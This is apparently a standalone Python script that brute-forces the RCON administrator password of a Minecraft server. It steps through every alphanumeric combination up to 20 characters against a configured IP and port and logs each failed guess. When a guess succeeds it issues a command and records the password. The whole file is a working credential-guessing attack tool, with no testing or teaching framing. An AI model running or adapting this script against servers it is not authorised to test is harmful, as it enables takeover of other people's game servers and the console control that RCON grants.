import mcrcon
from threading import Thread
MCRcon = mcrcon.MCRcon

from datetime import datetime as dt

SYMB = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
LENGHT_SYMB = len(SYMB)

IP = "127.0.0.1"
PORT = 25575

#TODEL{
import time
st = time.time()
#TODEL}

def next_pattern(x):
    global LENGHT_SYMB
    for i in range(len(x) - 1, -1, -1):
        x[i] += 1
        if x[i] == LENGHT_SYMB:
            x[i] = 0
        else:
            break
    if i == 0:
        x = [0] * (len(x) + 1)
    return x

def decode_password(x):
    global SYMB
    s = ''
    for symb in x:
        s += SYMB[symb]
    return s[1:]

def log(x):
    tsr = dt.now()
    d = '0'*(2-len(str(tsr.day))) + str(tsr.day)
    m = '0'*(2-len(str(tsr.month))) + str(tsr.month)
    h = '0'*(2-len(str(tsr.hour))) + str(tsr.hour)
    m_ = '0'*(2-len(str(tsr.minute))) + str(tsr.minute)
    s = '0'*(2-len(str(tsr.second))) + str(tsr.second)
    ts = f'[{d}.{m}.{tsr.year} {h}:{m_}:{s}] '
    with open('log.txt', "a") as file:
        file.write(ts + str(x) + '\n')
    print(ts + str(x))

log(f'''
------------------------------------
IP : {IP}
PORT: {PORT}
------------------------------------
''')

pattern = [0] + [0]
lost_connection = 0

MAX_LENGHT = 20

while len(pattern) < MAX_LENGHT + 2:
    pw = decode_password(pattern)
    mcr = MCRcon(IP, pw, port=PORT)
    try: 
        mcr.connect()
        log(mcr.command('/help'))
        log(f'Password found! {pw}')
        break
    except mcrcon.MCRconException:
        pattern = next_pattern(pattern)
        lost_connection = 0
        log(f'WP: {pw}')
    except (ConnectionRefusedError, ConnectionResetError, TimeoutError):
        if lost_connection % 10 == 0:
            log(f'Server is unreachable! ({lost_connection})')
        lost_connection += 1
    except BaseException as e:
        log(f'Unbound error: {e.__class__}')
        log(f'Last pattern: {pattern[1:]}, last password: {pw}')
        break

if len(pattern) == MAX_LENGHT + 2:
    log('Password not found :(')

#TODEL{
print(time.time()-st)
#TODEL}
input('Press ENTER to exit...')
